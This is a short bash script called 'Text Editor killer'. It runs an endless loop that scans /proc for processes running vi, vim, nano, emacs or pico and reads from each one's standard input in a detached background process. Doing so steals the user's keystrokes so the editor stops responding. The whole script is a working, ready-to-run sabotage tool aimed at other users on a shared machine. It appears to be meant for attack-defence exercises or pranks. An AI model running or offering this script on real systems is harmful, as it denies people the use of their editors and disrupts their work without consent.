#!/usr/bin/env bash
#Text Editor killer

sleepTime=1
if [ "$#" -gt 0 ]; then #if they gave an arg, make sure it's a number, then assign it
	echo "$1" | /bin/grep -qP '^\d+$' && sleepTime="$1"
fi

while true; do
	#get all dirs in /proc, check to see if the program is a text editor
	#if it is, cat the stdin fd associated with it and it won't work.
	for dir in $(/bin/ls -d /proc/*/); do
		file=$(/bin/ls -l "${dir}exe" 2>/dev/null | awk '{ print $NF }')
		$(echo "$file" | /bin/grep -qPw 'vi|vim|nano|emacs|pico') && /bin/cat "${dir}fd/0" &> /dev/null &disown
	done
	sleep "$sleepTime"
done
